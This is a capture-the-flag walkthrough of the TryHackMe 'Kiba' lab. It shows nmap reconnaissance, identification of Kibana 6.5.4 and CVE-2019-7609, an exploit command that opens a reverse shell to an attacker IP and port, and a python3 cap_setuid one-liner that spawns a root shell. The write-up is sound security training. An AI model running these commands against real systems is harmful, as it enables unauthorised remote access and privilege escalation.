---
title: Walkthrough - Kiba
published: true
---

RCE, Elastic, Python, Linux Capabilities, Kibana. Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.

[https://tryhackme.com/room/kiba](https://tryhackme.com/room/kiba)

* * * 

## What is the vulnerability that is specific to programming languages with prototype-based inheritance?

- [Prototype Pollution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

* * * 

## What is the version of visualization dashboard installed in the server?

- ``nmap -p- -T4 10.10.71.45 -vvv``

```
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack
80/tcp   open  http        syn-ack
5044/tcp open  lxi-evntsvc syn-ack
5601/tcp open  esmagent    syn-ack
```

- ``sudo nmap -sV -sT -sC -p22,80,5044,5601 10.10.71.45``

```
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Wed, 03 Aug 2022 14:29:32 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Wed, 03 Aug 2022 14:29:27 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Wed, 03 Aug 2022 14:29:28 GMT
|_    {"statusCode":404,"error":"Not Found"}
```

- kibana app located at ``http://10.10.71.45:5601/app/kibana``
- checking and Ctrl+F "Version" we find 6.5.4 in the source code.

* * * 

## What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

- Googling the Kibana version lead me to it and a script for execution https://github.com/LandGrey/CVE-2019-7609``

* * * 

## Compromise the machine and locate user.txt

- Found a script that executes payload ``python2 CVE-2019-7609-kibana-rce.py -u http://10.10.157.84:5601/ -host 10.2.127.225 -port 6666 --shell``

* * * 

## Capabilities is a concept that provides a security system that allows "divide" root privileges into different values - How would you recursively list all of these capabilities?

```
kiba@ubuntu:/home/kiba/.hackmeplease$ getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

* * * 

## Escalate privileges and obtain root.txt

- this python3 binary has ``CAP_SETUID`` set ``/home/kiba/.hackmeplease/python3 = cap_setuid+ep``
- escalate privilege to root ``./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'``

* * * 

